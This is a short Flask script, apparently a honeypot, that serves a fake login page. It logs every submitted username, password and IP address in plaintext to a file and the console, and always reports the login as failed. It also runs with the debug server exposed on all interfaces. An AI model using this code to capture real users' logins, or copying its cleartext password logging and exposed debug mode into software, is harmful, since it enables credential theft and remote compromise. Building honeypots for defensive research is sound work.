import logging
from flask import Flask, render_template, request, redirect, url_for
from datetime import datetime

app = Flask(__name__)

# Configure logging to file
logging.basicConfig(filename='honeypot.log', level=logging.INFO, format='%(message)s')

@app.route('/', methods=['GET'])
def index():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        ip_address = request.remote_addr
        
        # Log the captured data
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] IP: {ip_address} | User: {username} | Pass: {password}"
        logging.info(log_entry)
        print(f"CAPTURED: {log_entry}") # Print to console as well

        # Simulate a failed login or redirect
        return render_template('login.html', error="Invalid credentials. Please try again.")
    
    return render_template('login.html')

if __name__ == '__main__':
    # Run on 0.0.0.0 to be accessible from other machines if needed, port 5000
    app.run(host='0.0.0.0', port=5000, debug=True)
